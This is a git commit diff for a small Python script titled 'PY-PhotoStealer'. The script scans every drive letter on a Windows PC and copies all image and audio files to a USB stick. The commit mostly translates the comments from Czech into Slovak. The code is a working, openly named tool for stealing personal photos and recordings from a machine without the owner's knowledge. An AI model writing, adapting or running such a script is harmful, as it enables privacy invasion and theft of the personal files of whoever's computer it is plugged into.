e964c8b3d6f9857dae5f0c01d5f5cdf7ff171494
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2023-05-19 19:55:58 +0200

    PY-PhotoStealer.py

--- py.py
+++ py.py
@@ -1,29 +1,31 @@
 import os
 import shutil
 
-# Adresář na SD kartě, kam chcete kopírovat soubory
+#Adresa kde sa ulozia fotky
+
+# TREBA UPRAVIT PODLA POUZIVATELOVEHO USBcka (E:, D:, F:, G:, H, ...)
 destination_directory = "E:/PY-PhotoStealer/photos/"
 
-# Seznam přípon souborů, které chcete kopírovat
+# Zoznam pripon kt. chcem skopirovat
 file_extensions = [".jpg", ".png", ".jpeg", ".wav", ".mp3"]
 
-# Rekurzivně prochází všechny soubory a složky v daném adresáři
+# Kod definicie kt. prechadza VSETKY DRIVE pripojene k PC a hlada tam tieto pripony a SKOPIRUJE ICH a posle do USBCKA E:
 def process_directory(directory):
     for root, dirs, files in os.walk(directory):
         for file in files:
-            # Zkontrolujte, zda souborová přípona odpovídá seznamu přípon
+            # Skontroluje ci pripona sedi
             if file.lower().endswith(tuple(file_extensions)):
-                # Vytvořte cestu ke zdrojovému a cílovému souboru
+                # Vytvorenie cesty k root codu
                 source_path = os.path.join(root, file)
                 destination_path = os.path.join(destination_directory, file)
                 # Kopírujte soubor na SD kartu
                 shutil.copy2(source_path, destination_path)
 
-# Projde všechny jednotky (disky) na počítači
+# Prejde vsetky pripojene zariadenia
 drives = [chr(i) + ":" for i in range(65, 91)]
 for drive in drives:
     if os.path.exists(drive):
         process_directory(drive)
 
-print("Kopírování souborů dokončeno.")
+print("Kopirovanie suborov prebehlo USPESNE.")
 
